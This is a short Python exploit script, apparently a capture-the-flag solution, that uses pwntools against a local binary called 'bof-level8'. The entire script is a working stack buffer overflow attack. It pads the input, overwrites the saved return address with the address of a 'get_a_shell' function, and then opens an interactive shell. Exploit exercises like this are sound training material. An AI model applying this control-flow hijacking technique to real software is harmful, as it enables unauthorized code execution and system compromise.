#!/usr/bin/env python

from pwn import *
import os

env = {
    'ENVENVENV' : 'a'*200,
}

p = process('./bof-level8', env=env)
#context.terminal = ['tmux', 'splitw', '-h']
#gdb.attach(p)

e = ELF('./bof-level8')

addr_of_get_a_shell = e.symbols['get_a_shell']

buf ="A" * 0x10 + "BBBBBBBB" + p64(addr_of_get_a_shell)
buf = buf + "C" * (0x80 - len(buf))  + "\x00"

print(p.recv())

p.sendline(buf)

p.interactive()
